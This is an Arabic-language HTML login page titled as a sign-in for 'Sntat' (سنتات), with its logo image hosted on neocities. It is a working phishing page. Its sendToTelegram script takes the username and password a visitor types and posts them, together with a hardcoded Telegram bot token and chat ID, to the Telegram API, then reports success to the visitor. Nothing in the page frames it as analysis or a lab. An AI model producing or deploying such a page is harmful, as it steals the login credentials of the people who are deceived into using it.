<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى سنتات</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
        }
        .login-container {
            width: 300px;
            margin: auto;
            padding: 20px;
            background: white;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            margin-top: 20px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #218838;
        }
        .logo {
            width: 100%;
            max-width: 300px;
            height: auto;
            margin: 10px auto;
            display: block;
        }
    </style>
</head>
<body>

    <h2>تسجيل الدخول إلى سنتات</h2>

    <!-- صورة الشعار -->
    <img src="https://sntat.neocities.org/Screenshot_%D9%A2%D9%A0%D9%A2%D9%A5%D9%A0%D9%A2%D9%A1%D9%A8-%D9%A2%D9%A3%D9%A4%D9%A8%D9%A2%D9%A3.jpg" alt="شعار سنتات" class="logo">
    
    <div class="login-container">
        <input type="text" id="username" placeholder="اسم المستخدم">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button onclick="sendToTelegram()">تسجيل الدخول</button>
    </div>

    <script>
        function sendToTelegram() {
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            if (username === "" || password === "") {
                alert("يرجى إدخال اسم المستخدم وكلمة المرور");
                return;
            }

            var botToken = "8176431441:AAF8BozvtEjQCbgdZ6CqrrxOwIpJ7wB_pFI"; // التوكن الجديد
            var chatId = "1691133310"; // تأكد من صحة الـ ID الخاص بك
            var message = `🔐 تسجيل دخول جديد:\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;

            var url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => {
                console.log(response);  // سجل استجابة السيرفر
                return response.json();
            })
            .then(data => {
                console.log(data);  // سجل البيانات المستلمة
                if (data.ok) {
                    alert("تم إرسال بياناتك بنجاح!");
                } else {
                    alert("حدث خطأ أثناء إرسال البيانات!");
                }
            })
            .catch(error => {
                console.error("خطأ في إرسال البيانات: ", error); // سجل الخطأ
                alert("حدث خطأ أثناء إرسال البيانات!");
            });
        }
    </script>

</body>
</html>
